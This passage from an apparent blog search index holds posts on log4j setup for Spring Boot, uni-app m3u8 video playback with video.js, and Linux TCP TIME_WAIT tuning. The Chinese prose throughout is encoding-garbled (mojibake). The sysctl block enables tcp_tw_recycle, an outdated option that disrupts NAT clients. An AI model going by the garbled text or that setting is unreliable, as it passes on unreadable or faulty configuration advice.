class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ æ—¥å¿—é…ç½®"><a href="#æ·»åŠ æ—¥å¿—é…ç½®" class="headerlink" title="æ·»åŠ æ—¥å¿—é…ç½®"></a>æ·»åŠ æ—¥å¿—é…ç½®</h4><p>åˆ›å»º<code>log4j.properties</code>å¹¶ä¸”æ”¾åˆ°èµ„æºæ–‡ä»¶ç›®å½•<code>src/main/resources</code></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">log4j.rootLogger</span>=<span class="string">DEBUG,stdout,file</span></span><br><span class="line"><span class="meta">log4j.additivity.org.apache</span>=<span class="string">true</span></span><br><span class="line"></span><br><span class="line"><span class="meta">log4j.appender.stdout</span>=<span class="string">org.apache.log4j.ConsoleAppender</span></span><br><span class="line"><span class="meta">log4j.appender.stdout.threshold</span>=<span class="string">INFO</span></span><br><span class="line"><span class="meta">log4j.appender.stdout.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="meta">log4j.appender.stdout.layout.ConversionPattern</span>=<span class="string">%-5p %c&#123;1&#125;:%L - %m%n</span></span><br><span class="line"></span><br><span class="line"><span class="meta">log4j.appender.file</span>=<span class="string">org.apache.log4j.DailyRollingFileAppender</span></span><br><span class="line"><span class="meta">log4j.appender.file.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="meta">log4j.appender.file.DatePattern</span>=<span class="string">&#x27;.&#x27;yyyy-MM-dd-HH-mm</span></span><br><span class="line"><span class="meta">log4j.appender.file.layout.ConversionPattern</span>=<span class="string">%d&#123;yyyy-MM-dd HH:mm:ss&#125; %-5p %c&#123;1&#125;:%L - %m%n</span></span><br><span class="line"><span class="meta">log4j.appender.file.Threshold</span>=<span class="string">INFO</span></span><br><span class="line"><span class="meta">log4j.appender.file.append</span>=<span class="string">true</span></span><br><span class="line"><span class="meta">log4j.appender.file.File</span>=<span class="string">/tmp/logs/api/mylog.log</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uni-app å¼€å‘è§†é¢‘é¡¹ç›®ä¸­çš„æ’­æ”¾é—®é¢˜</title>
      <link href="post/4242/"/>
      <url>post/4242/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨ä½¿ç”¨uni-appå¼€å‘appä¸­å‘ç°æ¡†æ¶çš„åŸç”Ÿè§†é¢‘ç»„ä»¶æ€§èƒ½å¤ªå·®ï¼Œå¹¶ä¸”H5çš„è§†é¢‘ç»„ä»¶ä¸æ”¯æŒ<code>u3m8</code>æ ¼å¼çš„è§†é¢‘</p><span id="more"></span><h3 id="APPè§†é¢‘æ’­æ”¾æ€§èƒ½é—®é¢˜"><a href="#APPè§†é¢‘æ’­æ”¾æ€§èƒ½é—®é¢˜" class="headerlink" title="APPè§†é¢‘æ’­æ”¾æ€§èƒ½é—®é¢˜"></a>APPè§†é¢‘æ’­æ”¾æ€§èƒ½é—®é¢˜</h3><p>ä½¿ç”¨webviewè°ƒç”¨h5ä¸­çš„è§†é¢‘æ’­æ”¾å™¨ï¼Œæ³¨æ„webviewçš„å±‚çº§æ˜¯æœ€é«˜çš„ï¼Œæ— æ³•è¢«è¦†ç›–</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">let</span> wv = plus.webview.create(<span class="string">&quot;&quot;</span>,<span class="string">&quot;custom-webview&quot;</span>,&#123;</span><br><span class="line">   <span class="attr">plusrequire</span>:<span class="string">&quot;none&quot;</span>, <span class="comment">// ç¦æ­¢è¿œç¨‹ç½‘é¡µä½¿ç”¨plusçš„APIï¼Œæœ‰äº›ä½¿ç”¨muiåˆ¶ä½œçš„ç½‘é¡µå¯èƒ½ä¼šç›‘å¬plus.keyï¼Œé€ æˆå…³é—­é¡µé¢æ··ä¹±ï¼Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ç¦æ­¢</span></span><br><span class="line">   <span class="string">&#x27;uni-app&#x27;</span>: <span class="string">&#x27;none&#x27;</span>, <span class="comment">// ä¸åŠ è½½uni-appæ¸²æŸ“å±‚æ¡†æ¶ï¼Œé¿å…æ ·å¼å†²çª</span></span><br><span class="line">   <span class="attr">top</span>: uni.getSystemInfoSync().statusBarHeight <span class="comment">// æ”¾ç½®åœ¨titleNViewä¸‹æ–¹ã€‚å¦‚æœè¿˜æƒ³åœ¨webviewä¸Šæ–¹åŠ ä¸ªåœ°å€æ çš„ä»€ä¹ˆçš„ï¼Œå¯ä»¥ç»§ç»­é™ä½TOPå€¼</span></span><br><span class="line"> &#125;)</span><br><span class="line"></span><br><span class="line"> wv.loadURL(<span class="string">&#x27;è§†é¢‘è§£æåœ°å€&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// è®¾ç½®webviewæ ·å¼</span></span><br><span class="line"> wv.setStyle(&#123;</span><br><span class="line">   <span class="attr">height</span>: uni.getSystemInfoSync().windowHeight - uni.getSystemInfoSync().statusBarHeight,</span><br><span class="line">   <span class="comment">// å…¨å±è®¾ç½®, androidå¯ä»¥æ¨ªå±ï¼Œiosæ— æ³•æ¨ªå±</span></span><br><span class="line">   <span class="attr">videoFullscreen</span>: <span class="string">&#x27;landscape&#x27;</span>,</span><br><span class="line">   <span class="comment">// é€æ˜webviewèƒŒæ™¯</span></span><br><span class="line">   <span class="attr">backButtonAutoControl</span>: <span class="string">&#x27;none&#x27;</span>,</span><br><span class="line">   <span class="attr">background</span>: <span class="string">&quot;transparent&quot;</span>,</span><br><span class="line">   <span class="comment">// è¿›åº¦æ¡é¢œè‰²</span></span><br><span class="line">   <span class="attr">progress</span>: &#123;</span><br><span class="line">     <span class="attr">color</span>: <span class="string">&#x27;#F9D147&#x27;</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å½“å‰é¡µé¢çš„webviewå¯¹è±¡ï¼Œénvueé¡µé¢å¯ä»¥ä½¿ç”¨ this.$scope.$getAppWebview()</span></span><br><span class="line"> <span class="keyword">var</span> currentWebview = plus.webview.currentWebview()</span><br><span class="line"> currentWebview.append(wv)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// æ·»åŠ ç›‘å¬æ—¶é—´</span></span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   wv = currentWebview.children()</span><br><span class="line">   <span class="comment">// æ·»åŠ åŠ è½½ä¸­ç›‘å¬</span></span><br><span class="line">   wv[<span class="number">0</span>].addEventListener(<span class="string">&quot;loading&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">&#x27;loading&#x27;</span>)</span><br><span class="line">   &#125;,<span class="literal">false</span>)</span><br><span class="line">   <span class="comment">// æ·»åŠ åŠ è½½å®Œæˆç›‘å¬</span></span><br><span class="line">   wv[<span class="number">0</span>].addEventListener(<span class="string">&quot;loaded&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">&#x27;loaded&#x27;</span>)</span><br><span class="line">   &#125;)</span><br><span class="line"> &#125;, <span class="number">600</span>)</span><br></pre></td></tr></table></figure><h3 id="H5-æ’­æ”¾m3u8æ ¼å¼è§†é¢‘"><a href="#H5-æ’­æ”¾m3u8æ ¼å¼è§†é¢‘" class="headerlink" title="H5 æ’­æ”¾m3u8æ ¼å¼è§†é¢‘"></a>H5 æ’­æ”¾m3u8æ ¼å¼è§†é¢‘</h3><p>åˆ›å»º<code>index.html</code>æ¨¡ç‰ˆ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">            &lt;%= htmlWebpackPlugin.options.title %&gt;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Open Graph data --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;meta property=&quot;og:title&quot; content=&quot;Title Here&quot; /&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;meta property=&quot;og:url&quot; content=&quot;http://www.example.com/&quot; /&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;meta property=&quot;og:image&quot; content=&quot;http://example.com/image.jpg&quot; /&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;meta property=&quot;og:description&quot; content=&quot;Description Here&quot; /&gt; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> coverSupport = <span class="string">&#x27;CSS&#x27;</span> <span class="keyword">in</span> <span class="built_in">window</span> &amp;&amp; <span class="keyword">typeof</span> CSS.supports === <span class="string">&#x27;function&#x27;</span> &amp;&amp; (CSS.supports(<span class="string">&#x27;top: env(a)&#x27;</span>) || CSS.supports(<span class="string">&#x27;top: constant(a)&#x27;</span>))</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&#x27;</span> + (coverSupport ? <span class="string">&#x27;, viewport-fit=cover&#x27;</span> : <span class="string">&#x27;&#x27;</span>) + <span class="string">&#x27;&quot; /&gt;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;static/index.&lt;%= VUE_APP_INDEX_CSS_HASH %&gt;.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/video.js/7.11.1/video-js.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/video.js/7.11.1/video.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">strong</span>&gt;</span>Please enable JavaScript to continue.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- built files will be auto injected --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨<code>manifest.json</code>è®¾ç½®åˆ›å»ºçš„H5æ¨¡ç‰ˆ</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;h5&quot;</span> : &#123;</span><br><span class="line">    <span class="attr">&quot;template&quot;</span> : <span class="string">&quot;index.html&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºvideoå®¹å™¨</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span></span></span><br><span class="line"><span class="tag">  <span class="attr">class</span>=<span class="string">&quot;video-js&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;video&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">ref</span>=<span class="string">&quot;video&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ·»åŠ videoæ’­æ”¾å™¨</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºvideoå…ƒç´ </span></span><br><span class="line"><span class="keyword">let</span> video = <span class="built_in">document</span>.createElement(<span class="string">&#x27;video&#x27;</span>)</span><br><span class="line">video.id = <span class="string">&#x27;video&#x27;</span></span><br><span class="line">video.style = <span class="string">&#x27;width: 100%; height: 100%;&#x27;</span></span><br><span class="line">video.controls = <span class="literal">false</span>;</span><br><span class="line">video.setAttribute(<span class="string">&#x27;playsinline&#x27;</span>, <span class="literal">true</span>) <span class="comment">//IOSå¾®ä¿¡æµè§ˆå™¨æ”¯æŒå°çª—å†…æ’­æ”¾</span></span><br><span class="line">video.setAttribute(<span class="string">&#x27;webkit-playsinline&#x27;</span>, <span class="literal">true</span>) <span class="comment">//è¿™ä¸ªbaiå±æ€§æ˜¯ios 10ä¸­è®¾ç½®å¯ä»¥è®©è§†é¢‘åœ¨å°duçª—å†…æ’­æ”¾ï¼Œä¹Ÿå°±æ˜¯ä¸æ˜¯å…¨zhiå±æ’­æ”¾çš„videoæ ‡ç­¾çš„ä¸€ä¸ªå±æ€§</span></span><br><span class="line">video.setAttribute(<span class="string">&#x27;x5-video-player-type&#x27;</span>, <span class="string">&#x27;h5&#x27;</span>) <span class="comment">//å®‰å“ å£°æ˜å¯ç”¨åŒå±‚H5æ’­æ”¾å™¨ å¯ä»¥åœ¨videoä¸Šé¢åŠ ä¸œè¥¿</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> source = <span class="built_in">document</span>.createElement(<span class="string">&#x27;source&#x27;</span>)</span><br><span class="line">source.src = <span class="string">&#x27;è§†é¢‘æ’­æ”¾åœ°å€&#x27;</span></span><br><span class="line">source.type = <span class="string">&#x27;application/x-mpegURL&#x27;</span></span><br><span class="line"></span><br><span class="line">video.appendChild(source);</span><br><span class="line"><span class="built_in">this</span>.$refs.video.$el.appendChild(video);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> that = <span class="built_in">this</span></span><br><span class="line"><span class="built_in">this</span>.player = videojs(<span class="string">&#x27;video&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">poster</span>: <span class="string">&#x27;poster.png&#x27;</span>, <span class="comment">// è§†é¢‘å°é¢å›¾åœ°å€</span></span><br><span class="line">  <span class="attr">title</span>: <span class="string">&#x27;è§†é¢‘æ ‡é¢˜&#x27;</span>,</span><br><span class="line">  <span class="attr">playbackRates</span>: [<span class="number">0.7</span>, <span class="number">1.0</span>, <span class="number">1.5</span>, <span class="number">2.0</span>], <span class="comment">//æ’­æ”¾é€Ÿåº¦</span></span><br><span class="line">  <span class="attr">autoDisable</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">preload</span>: <span class="string">&#x27;none&#x27;</span>, <span class="comment">// auto - å½“é¡µé¢åŠ è½½åè½½å…¥æ•´ä¸ªè§†é¢‘ meta - å½“é¡µé¢åŠ è½½ååªè½½å…¥å…ƒæ•°æ® none - å½“é¡µé¢åŠ è½½åä¸è½½å…¥è§†é¢‘</span></span><br><span class="line">  <span class="attr">language</span>: <span class="string">&#x27;zh-CN&#x27;</span>,</span><br><span class="line">  <span class="attr">fluid</span>: <span class="literal">true</span>, <span class="comment">// è‡ªé€‚åº”å®½é«˜</span></span><br><span class="line">  <span class="attr">muted</span>: <span class="literal">false</span>, <span class="comment">//  æ˜¯å¦é™éŸ³</span></span><br><span class="line">  <span class="attr">aspectRatio</span>: <span class="string">&#x27;16:9&#x27;</span>, <span class="comment">// å°†æ’­æ”¾å™¨ç½®äºæµç•…æ¨¡å¼ï¼Œå¹¶åœ¨è®¡ç®—æ’­æ”¾å™¨çš„åŠ¨æ€å¤§å°æ—¶ä½¿ç”¨è¯¥å€¼ã€‚å€¼åº”è¯¥ä»£è¡¨ä¸€ä¸ªæ¯”ä¾‹ - ç”¨å†’å·åˆ†éš”çš„ä¸¤ä¸ªæ•°å­—ï¼ˆä¾‹å¦‚&quot;16:9&quot;æˆ–&quot;4:3&quot;ï¼‰</span></span><br><span class="line">  <span class="attr">controls</span>: <span class="literal">false</span>, <span class="comment">//æ˜¯å¦æ‹¥æœ‰æ§åˆ¶æ¡ ã€é»˜è®¤trueã€‘,å¦‚æœè®¾ä¸ºfalse ,é‚£ä¹ˆåªèƒ½é€šè¿‡apiè¿›è¡Œæ§åˆ¶äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ç•Œé¢ä¸Šä¸ä¼šå‡ºç°ä»»ä½•æ§åˆ¶æŒ‰é’®</span></span><br><span class="line">  <span class="attr">autoplay</span>: <span class="literal">true</span>, <span class="comment">//å¦‚æœtrue,æµè§ˆå™¨å‡†å¤‡å¥½æ—¶å¼€å§‹å›æ”¾ã€‚ autoplay: &quot;muted&quot;, // //è‡ªåŠ¨æ’­æ”¾å±æ€§,muted:é™éŸ³æ’­æ”¾</span></span><br><span class="line">  <span class="attr">loop</span>: <span class="literal">true</span>, <span class="comment">// å¯¼è‡´è§†é¢‘ä¸€ç»“æŸå°±é‡æ–°å¼€å§‹ã€‚ è§†é¢‘æ’­æ”¾ç»“æŸåï¼Œæ˜¯å¦å¾ªç¯æ’­æ”¾</span></span><br><span class="line">  <span class="attr">techOrder</span>: [<span class="string">&quot;html5&quot;</span>], <span class="comment">//æ’­æ”¾é¡ºåº</span></span><br><span class="line">  <span class="attr">screenshot</span>:<span class="literal">true</span></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;è¯·æ±‚æ•°æ®æ—¶é‡åˆ°é”™è¯¯&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">this</span>.on(<span class="string">&#x27;stalled&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;ç½‘é€Ÿå¤±é€Ÿ&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">this</span>.on(<span class="string">&#x27;play&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;å¼€å§‹æ’­æ”¾&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">this</span>.on(<span class="string">&#x27;pause&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;æš‚åœæ’­æ”¾&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">this</span>.on(<span class="string">&quot;timeupdate&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;æ’­æ”¾è¿›åº¦å‘ç”Ÿå˜åŒ–&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>é¡µé¢åªèƒ½å­˜åœ¨ä¸€ä¸ªæ’­æ”¾å™¨ï¼Œé‡æ–°åˆ›å»ºæ—¶ï¼Œè®°å¾—é”€æ¯ä¸Šæ¬¡çš„</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.player.dispose()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> uniapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> uniapp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux ç½‘ç»œå†…æ ¸å‚æ•°ä¼˜åŒ–</title>
      <link href="post/43734/"/>
      <url>post/43734/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨ç¡¬ä»¶èµ„æºæœ‰é™çš„æƒ…å†µä¸‹ï¼Œæœ€å¤§çš„å‹æ¦¨æœåŠ¡å™¨çš„æ€§èƒ½ï¼Œæé«˜æœåŠ¡å™¨çš„å¹¶å‘å¤„ç†èƒ½åŠ›ï¼Œæ˜¯å¾ˆå¤šè¿ç»´æŠ€æœ¯äººå‘˜æ€è€ƒçš„é—®é¢˜</p><span id="more"></span><h3 id="TIME-WAIT"><a href="#TIME-WAIT" class="headerlink" title="TIME_WAIT"></a>TIME_WAIT</h3><p>Linuxç³»ç»Ÿä¸‹ï¼ŒTCPè¿æ¥æ–­å¼€åï¼Œä¼šä»¥TIME_WAITçŠ¶æ€ä¿ç•™ä¸€å®šçš„æ—¶é—´ï¼Œç„¶åæ‰ä¼šé‡Šæ”¾ç«¯å£ã€‚å½“å¹¶å‘è¯·æ±‚è¿‡å¤šçš„æ—¶å€™ï¼Œå°±ä¼šäº§ç”Ÿå¤§é‡çš„TIME_WAITçŠ¶æ€çš„è¿æ¥ï¼Œæ— æ³•åŠæ—¶æ–­å¼€çš„è¯ï¼Œä¼šå ç”¨å¤§é‡çš„ç«¯å£èµ„æºå’ŒæœåŠ¡å™¨èµ„æºï¼Œå¯ä»¥ä¼˜åŒ–TCPçš„å†…æ ¸å‚æ•°ï¼Œæ¥åŠæ—¶å°†TIME_WAITçŠ¶æ€çš„ç«¯å£æ¸…ç†æ‰ã€‚</p><p>æŸ¥çœ‹å½“å‰TCPè¿æ¥çš„çŠ¶æ€å’Œå¯¹åº”çš„è¿æ¥æ•°é‡ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -n | awk <span class="string">&#x27;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºç±»ä¼¼ä¸‹é¢çš„ç»“æœï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LAST_ACK 1</span><br><span class="line">ESTABLISHED 482</span><br><span class="line">FIN_WAIT1 4</span><br><span class="line">TIME_WAIT 1780</span><br></pre></td></tr></table></figure><p>åªç”¨å…³å¿ƒTIME_WAITçš„ä¸ªæ•°ï¼Œæ•°é‡è¿‡å¤§çš„è¯å°±æœ‰å¿…è¦è°ƒæ•´ä¸‹Linuxçš„TCPå†…æ ¸å‚æ•°ï¼Œè®©ç³»ç»Ÿæ›´å¿«çš„é‡Šæ”¾TIME_WAITè¿æ¥</p><p>ç”¨vimæ‰“å¼€é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>åŠ å…¥ä¸‹é¢çš„å†…å®¹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¡¨ç¤ºå¼€å¯SYN Cookiesã€‚å½“å‡ºç°SYNç­‰å¾…é˜Ÿåˆ—æº¢å‡ºæ—¶ï¼Œå¯ç”¨cookiesæ¥å¤„ç†ï¼Œå¯é˜²èŒƒå°‘é‡SYNæ”»å‡»ï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºå…³é—­</span></span><br><span class="line">net.ipv4.tcp_syncookies = 1</span><br><span class="line"><span class="comment"># è¡¨ç¤ºå¼€å¯é‡ç”¨ã€‚å…è®¸å°†TIME-WAIT socketsé‡æ–°ç”¨äºæ–°çš„TCPè¿æ¥ï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºå…³é—­</span></span><br><span class="line">net.ipv4.tcp_tw_reuse = 1</span><br><span class="line"><span class="comment"># è¡¨ç¤ºå¼€å¯TCPè¿æ¥ä¸­TIME-WAIT socketsçš„å¿«é€Ÿå›æ”¶ï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºå…³é—­</span></span><br><span class="line">net.ipv4.tcp_tw_recycle = 1</span><br><span class="line"><span class="comment"># ä¿®æ”¹ç³»çµ±é»˜è®¤çš„ TIMEOUT æ—¶é—´</span></span><br><span 